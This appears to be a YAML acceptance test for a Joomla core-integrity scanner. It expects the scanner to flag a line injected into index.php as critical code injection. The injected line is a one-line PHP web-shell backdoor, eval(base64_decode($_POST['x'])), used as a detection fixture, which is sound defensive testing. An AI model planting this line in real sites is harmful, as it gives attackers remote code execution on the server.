# Positivo (SC-002, escenario de aceptación 2): línea inyectada en index.php
# → inyección de código, máxima severidad.
case: core-injected-line
base:
  cms: joomla
  version: "1.1.0"
expect:
  exit_code: 1
  findings:
    - rule_id: J0W-CORE-002
      subject: index.php
      min_severity: critical
mutations:
  - op: inject_line
    path: index.php
    after_line: 1
    content: "eval(base64_decode($_POST['x']));"
